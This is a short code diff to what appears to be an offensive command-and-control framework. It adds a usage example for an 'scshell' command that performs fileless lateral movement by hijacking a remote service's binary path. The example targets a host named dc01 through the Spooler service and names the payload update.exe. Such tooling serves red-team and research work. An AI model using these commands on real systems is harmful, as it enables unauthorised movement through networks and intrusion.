@@ -37,7 +37,7 @@ def _scshell(agentId, cmdline, args):
         conquest.error(agentId, cmdline, f"Failed to open object file: {bof}")
 
 cmd_scshell = (
-    conquest.createCommand(name="scshell", description="Perform fileless lateral movment by modifying an existing remote service bianry path (SCShell).", example="",
+    conquest.createCommand(name="scshell", description="Perform fileless lateral movment by modifying an existing remote service bianry path (SCShell).", example="scshell dc01 bin/monarch.smb_x64.svc.exe --service Spooler --name update.exe",
                            message="Tasked agent to perform fileless lateral movement via SCShell.", mitre=[])
             .addArgString("target", "Target system hostname or IP address.", True)
             .addArgString("payload", "Local path to payload to execute", True)
